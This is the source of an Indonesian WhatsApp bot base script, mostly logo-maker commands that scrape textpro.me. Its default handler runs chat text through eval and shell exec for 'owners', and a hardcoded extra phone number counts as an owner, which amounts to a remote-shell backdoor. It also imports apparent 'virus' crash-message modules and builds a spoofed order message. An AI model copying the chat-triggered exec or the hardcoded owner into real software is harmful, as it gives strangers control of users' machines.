/* BASE ORI CREATED By Zero YT7
Follow Me On All Sosial Media
• My Youtube : Zero YT7
• My Instagram : @Zero_YT7
• My Github : Zero-YT7

Donate Me For Support
• https://sociabuzz.com/ZeroYT7/tribe
*/

/* BASE SCRIPT INI BARU JADI DAN MASIH FRESH
• SIMPLE
• RAPI
• KEREN
JIKA INGIN BELI YG FULL NO ENC / FULL FITUR
BISA LNGSUNG HUBUNGI SAYA
NO 1 : 081548926840
NO 2 : 085157740529
*/

process.on('uncaughtException', console.error)
require('../options/config')
require('../options/Mess')
var { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
var fs = require('fs')
var util = require('util')
var chalk = require('chalk')
var { exec, spawn, execSync } = require("child_process")
var axios = require('axios')
var path = require('path')
var os = require('os')
var fetch = require('node-fetch')
var crypto = require('crypto')
var toMs = require('ms')
var moment = require('moment-timezone')
var { JSDOM } = require('jsdom')
var speed = require('performance-now')
var x = require('xfarr-api')
var maker = require('mumaker')
var ggs = require('google-it')
var { performance } = require('perf_hooks')
var { Primbon } = require('scrape-primbon')
var primbon = new Primbon()
var hx = require("hxz-api")
var { Quotes, MerdekaNews } = require("dhn-api")
var { EmojiAPI } = require("emoji-api")
var emoji = new EmojiAPI()
var yts = require('yt-search')
var { pinterest, wallpaper, ringtoneringtone, wikimedia } = require('../message/scrape/scraper.js')
var { mediafireDl } = require('../message/scrape/mediafire.js')
var { jadibot } = require('../message/jadibot')
var { philips } = require('../message/virtex/philips')
var { virus } = require('../message/virtex/virus')
var { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, packname, author, fetchJson, getBuffer, jsonformat, creator, format, parseMention, getRandom, generateProfilePicture, reSize}= require('../message/myfunc')
var { color, bgcolor } = require("../message/color")

//━━━━━━━━━━━━━━━[ READ DATABASE ]━━━━━━━━━━━━━━━━━//

global.db = JSON.parse(fs.readFileSync('./pth/database.json'))
var antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
...(global.db || {})
}

//━━━━━━━━━━━━━━━[ READ IMAGE ]━━━━━━━━━━━━━━━━━//

var thumbnail = fs.readFileSync('./file/image/thumbnail.jpg')
var fake = fs.readFileSync('./file/image/fake.PNG')

//━━━━━━━━━━━━━━━[ TIME ]━━━━━━━━━━━━━━━━━//

var tanggl = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
var timetime = moment().tz('Asia/Jakarta').format("HH:mm:ss")
var timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
var timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");

var time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Good Midnight'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Good Night'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Good Afternoon Before Evening'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Good Day'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Good Morning Before Lunch'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Good Morning'
 }

//━━━━━━━━━━━━━━━[ MODULE EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = zeroyt7 = async (zeroyt7, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi.test(body) ? body.match(/^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi)[0] : "" : prefa ?? global.prefix
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var args = body.trim().split(/ +/).slice(1)
var pushname = m.pushName || "No Name"
var botNumber = await zeroyt7.decodeJid(zeroyt7.user.id)
var isOwner = global.owner == m.sender ? true : ["6281319944917@s.whatsapp.net"].includes(m.sender) ? true : false
var itsMe = m.sender == botNumber ? true : false
var text = args.join(' ')
var q = args.join(' ')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
var quoted = m.quoted ? m.quoted : m
var mime = (quoted.msg || quoted).mimetype || ''
var isMedia = /image|video|sticker|audio/.test(mime)
var sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
var more = String.fromCharCode(8206)
var readmore = more.repeat(4001)
var groupMetadata = m.isGroup ? await zeroyt7.groupMetadata(from).catch(e => {}) : ''
var groupName = m.isGroup ? groupMetadata.subject : ''
var participants = m.isGroup ? await groupMetadata.participants : ''
var groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
var groupOwner = m.isGroup ? groupMetadata.owner : ''
var isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
var isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var isAntilink = m.isGroup ? antilink.includes(from) : false

//━━━━━━━━━━━━━━━[ PUBLIC & SELF ]━━━━━━━━━━━━━━━━━//

if (!zeroyt7.public) {
if (isOwner && !m.key.fromMe) return
}

//━━━━━━━━━━━━━━━[ AUTOREAD ]━━━━━━━━━━━━━━━━━//

if (m.message && !m.key.fromMe) {
zeroyt7.readMessages([m.key])

//━━━━━━━━━━━━━━━[ CONSOLE ]━━━━━━━━━━━━━━━━━//

zeroyt7.sendPresenceUpdate('available', from)
console.log(chalk.black(chalk.bgWhite('[ Zero YT7 ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
var reactionMessage = {
react: {
text: args[0],
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}

//━━━━━━━━━━━━━━━[ REPLY ]━━━━━━━━━━━━━━━━━//

var reply = (teks) => {
zeroyt7.sendMessage(from, { text: teks }, { zeroyt7 })
}

//━━━━━━━━━━━━━━━[ BUTTONS ]━━━━━━━━━━━━━━━━━//

const buttons2 = [
    { urlButton: { displayText: `JOJO - BOT WHATSAPP`, url : `https://wa.me/6288213292687?text=/menu` } },
    { quickReplyButton: { displayText: `OWNER BOT`, id: `${prefix}owner` } },
]

//━━━━━━━━━━━━━━━[ FAKE ]━━━━━━━━━━━━━━━━━//

const ftroli = {
key: {
fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "status@broadcast"},
"message": {
orderMessage: {
itemCount: 2022,status: 200, 
thumbnail: (fake), 
surface: 200, 
message: `JOJO - BOT`, 
orderTitle: 'BOT WHATSAPP', 
sellerJid: '0@s.whatsapp.net'}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded":true},
sendEphemeral: true}

//━━━━━━━━━━━━━━━[ ANTILINK ]━━━━━━━━━━━━━━━━━//

if (isAntilink) {
if (!isBotAdmins) return
if (budy.includes(`https://chat.whatsapp.com/`)) {
bvl = `*GROUP LINK DETECTOR*\n\nAdmin Telah Mengirim Link, Admin Tidak Akan Dikick`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
kice = m.sender
zeroyt7.sendMessage(from, {text:`*GROUP LINK DETECTOR*\n\n@${kice.split("@")[0]} Akan Dikick Karena Mengirim Link Di Group Ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
setTimeout( () => {
zeroyt7.groupParticipantsUpdate(from, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}, 3000)
} else {
}
}
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

//━━━━━━━━━━━━━━━[ CMD WITH MEDIA ]━━━━━━━━━━━━━━━━━//

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: zeroyt7.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, zeroyt7.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
zeroyt7.ev.emit('messages.upsert', msg)
}

//━━━━━━━━━━━━━━━[ FITUR ]━━━━━━━━━━━━━━━━━//

switch(command) {
    case 'owner': {
        let vcard = `BEGIN:VCARD\n`
        + `VERSION:3.0\n`
        + `N:;${global.ownerName}.;;;`
        + `FN:${global.ownerName}.\n`
        + `ORG:${global.ownerName};\n`
        + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
        + `END:VCARD`
        let msg = await zeroyt7.sendMessage(from, { contacts: { displayName: `${global.owner}`, contacts: [{ vcard }] } }, { quoted: m })
                               
        }
        break
/*case 'menu': {
menu = `Hy Saya Adalah ${global.botName}
Siap Membantu Anda
Untuk Mempermudah Aktivitas
Di WhatsApp Silahkan Pilih
List Di Bawah Ini

Creator : ${creator}
My Script : ${global.botName}

Thanks To
• Allah S.W.T
• Ortuku
• All Creator Bot
• All Subscriber Ku`
zeroyt7.sendMessage(from, { viewOnce : true, caption: menu, image: thumbnail, templateButtons: buttonsDefault, footer: creator, mentions: [m.sender] })
}
break*/
case 'menu' : {
allmenu = `*[ PEMBUATAN LOGO/MAKER ]*
• ${prefix}3dbox
• ${prefix}drapwater
• ${prefix}papercut
• ${prefix}transformer
• ${prefix}neondevil
• ${prefix}3dstone
• ${prefix}thunder
• ${prefix}graffiti
• ${prefix}pornhub
• ${prefix}blackpink
• ${prefix}glitch
• ${prefix}glitch2
• ${prefix}glitch3
• ${prefix}3dspace
• ${prefix}lion
• ${prefix}3dneon
• ${prefix}neon
• ${prefix}greenneon
• ${prefix}bokeh
• ${prefix}hollographic
• ${prefix}bear
• ${prefix}wolf
• ${prefix}joker
• ${prefix}dropwater
• ${prefix}neonlight
• ${prefix}natural
• ${prefix}carbon
• ${prefix}pencil
• ${prefix}candy
• ${prefix}christmas
• ${prefix}3dchristmas
• ${prefix}sparklechirtmas
• ${prefix}deepsea
• ${prefix}scifi
• ${prefix}rainbow
• ${prefix}waterpipe
• ${prefix}spooky
• ${prefix}circuit
• ${prefix}discovery
• ${prefix}metalic
• ${prefix}fiction
• ${prefix}demon
• ${prefix}berry
• ${prefix}thunder
• ${prefix}magma
• ${prefix}harrypotter
• ${prefix}brokenglass
• ${prefix}watercolor
• ${prefix}multicolor
• ${prefix}underwater
• ${prefix}graffitibike
• ${prefix}snow
• ${prefix}cloud
• ${prefix}honey
• ${prefix}ice
• ${prefix}fruitjuice
• ${prefix}biscuit
• ${prefix}wood
• ${prefix}chocolate
• ${prefix}strawberry
• ${prefix}matrix
• ${prefix}blood
• ${prefix}toxic
• ${prefix}lava
• ${prefix}rock
• ${prefix}bloodglass
• ${prefix}hallowen
• ${prefix}darkgold
• ${prefix}wicker
• ${prefix}firework
• ${prefix}skeleton
• ${prefix}sand
• ${prefix}glue
• ${prefix}1977
• ${prefix}leaves
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: allmenu, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break

case '3dbox': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'drapwater': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'papercut': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'transformer': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'neondevil': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case '3dstone': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'thunder': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}  
break
case 'graffiti': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'pornhub': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'blackpink': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'glitch': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'glitch2': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'glitch3': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case '3dspace': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'lion': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case '3dneon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'neon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'greenneon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'bokeh': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'hollographic': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'bear': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'wolf': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'joker': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'dropwater': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'neonlight': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'natural': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'carbon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'pencil': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: ftroli }))
.catch((err) => console.log(err));
}
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'berry': case 'thunder': case 'magma':
case 'harrypotter': case 'brokenglass': 
case 'watercolor': case 'multicolor': case 'underwater': case 'graffitibike':
case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
case 'firework': case 'skeleton': case 'sand': case 'glue': case '1917': case 'leaves': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Zero YT7`) 
reply(mess.wait)
var link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
var anu = await maker.textpro(link, q)
zeroyt7.sendMessage(from, { image: { url: anu }, caption: creator }, { quoted: ftroli })
}
break

// ━━━━━━━━━━━━━[ AKHIRAN ]━━━━━━━━━━━━━━━━━//

default:
if (budy.startsWith('=>')) {
if (!isOwner) return reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isOwner) return reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isOwner) return reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
	
if (from.endsWith('@s.whatsapp.net') && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}
	
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
